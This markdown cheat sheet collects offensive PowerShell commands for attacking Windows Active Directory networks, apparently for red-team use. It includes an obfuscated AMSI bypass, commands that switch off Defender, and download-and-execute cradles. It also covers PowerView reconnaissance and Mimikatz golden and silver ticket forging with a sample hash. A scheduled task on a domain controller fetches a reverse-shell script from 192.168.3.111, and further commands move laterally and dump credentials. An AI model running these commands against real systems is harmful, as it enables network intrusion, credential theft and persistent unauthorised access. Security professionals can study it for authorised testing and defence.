# Commands

# Powershell Basics

#### Help
```
Get-Help Get-Help
Get-Help *
Get-Help process
Get-Help Get-Item -Full
Get-Help Get-Item -Examples
```
#### Modules
```Import-Module modulepath```

```Get-Command -Module <modulename>```



#### Filter property string search

```Get-ADUser -Filter * | Where-Object {$_.Name -like '*smith*'}```
  
```Get-Service | Where-Object {$_.DisplayName -like '*Windows*'}```



```Get-Process | Select-Object -Property * | Where-Object { $_.psobject.Properties.Value -like '*chrome*' }```

```Get-Process | Select-Object -Property * | Where-Object { $_.* -like '*chrome*' }```

```Get-ANYTHING  | Select-Object -Property * | Where-Object { $_.* -like '*admin*' }```

# Running Powershell
#### AMSI Bypass
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```



#### EP Bypass
Start PowerShell from cmd.exe:

```Powershell- c <cmd>```

```powershell.exe -ep bypass```

OR If already running-

```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass```

```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Restricted```

```$Env:PSExecutionPolicyPreference = 'Bypass'```

#### MS Bypass
```Set-MpPreference -DisableIOAVProtection $true```
```Set-MpPreference -DisableRealtimeMonitoring $true```
#### Kerberos Tickets
```klist```

# PS Ingress

#### Execution cradle
```IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')```

#### download
```(new-object System.Net.Webclient).DownloadFile("https://raw.githubusercontent.com/conma293/mvp/main/1.ps1", "C:\Windows\Temp\1.ps1")```

# Powerview
```. .\PowerView.ps1```

Readme - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

#### Machines

```Get-DomainComputer```
```Get-DomainComputer –OperatingSystem "*Server 2016*" ```
```Get-DomainComputer -Ping```
```Get-DomainComputer -FullData```

```Get-ADComputer -Filter * | select Name```

```Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' - Properties OperatingSystem | select Name,OperatingSystem```

```Get-ADComputer -Filter * -Properties *```

```Get-ADComputer -Filter *  -Properties DNSHostName | %{Test- Connection -Count 1 -ComputerName $_.DNSHostName}```

#### User Search
```Get-DomainUser```
```Get-DomainUser –Identity bob```

```Get-ADUser -Filter * -Properties *```
```Get-ADUser -Identity bob -Properties *```

#### Group Membership
```Get-DomainGroupMember -Identity "Domain Admin*" -Recurse```

```Get-DomainGroupMember -Identity "Domain Admin*" | select GroupName, MemberName```

```Get-ADGroupMember -Identity "Domain Admins" -Recursive```


```Get-DomainGroup –UserName "bob"```


#### Shares, GPOs, etc


```Invoke-ShareFinder –Verbose```

```Invoke-FileFinder –Verbose```

```Get-NetFileServer```

* * *
#### Users and Groups of Machines
```Get-NetLocalGroup -ComputerName <hostname>``` List all the local groups on a machine (needs admin privs on non-
dc machines)

```Get-NetLocalGroupMember -ComputerName <hostname>``` Get members of all the local groups on a machine (needs admin privs on non-dc machines)


```Get-NetLoggedon –ComputerName <hostname>``` (needs localadmin)

```Get-LoggedonLocal -ComputerName <hostname>``` (needs localadmin)
#### User Hunting

```Run Find-LocalAdminAccess``` - find all machines on current domain where current user has localadmin access

```Run Find-LocalAdminAccess -CheckAccess``` - list sessions where you have access to the machine

```Invoke-UserHunter``` for users/groups you want - will show all active sessions for users/users of specified groups

```Invoke-UserHunter -GroupName "RDPUsers"```

* * *

# Priv Esc

Run PowerUp - are you already localadmin?
```
. ./PowerUp.ps1
Invoke-AllChecks 
```


```Get-UnquotedService```

```Get-ModifiableService```

```Get-ModifiableServiceFile | select servicename, abusefeature```

# Tickets

NTLM == RC4

#### Golden

```
Invoke-Mimikatz -Command '"kerberos::golden 
/User:DonaldDuck /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

#### Silver
SPNs - https://adsecurity.org/?page_id=183
```
Invoke-Mimikatz -Command '"kerberos::golden 
/domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /target:dc01.ecorp.local /service:HOST 
/rc4:731a061e57100b658bc59d71f5176e93 /user:Administrator /ptt"
```

```
schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Updater123" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.3.111:8080/Invoke-PowerShellTcp.ps1'')'"
```

```
schtasks /Run /S dc01.ecorp.moneycorp.local /TN "Updater123"
```
# Lateral Movement
#### PowerShell Remoting
```Find-LocalAdminAccess -CheckAccess```

```Enter-PSSession –Computername Server1```

```$Sess = New-PSSession –Computername Server1```

```Invoke-Command –Session $Sess –ScriptBlock {whoami;host name;ipconfig}```

```Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get- Process}```

```Invoke-Command –Session $Sess –ScriptBlock {$Proc.name}```

```Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess ```

If functions not on remote host:-

```. ./Invoke-Mimikatz.ps1```
```Invoke-Command –Session $Sess -ScriptBlock ${function:Invoke-Mimikatz}```

#### Invoke Mimikatz
```. ./Invoke-Mimikatz.ps1```

```Invoke-Mimikatz -ComputerName```

```Invoke-Mimikatz -ComputerName -DumpCreds```

```Invoke-Mimikatz -ComputerName -Command "kerberos::list"```

##### Copy Across
```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
``` ls //Server1.local/c$/temp```
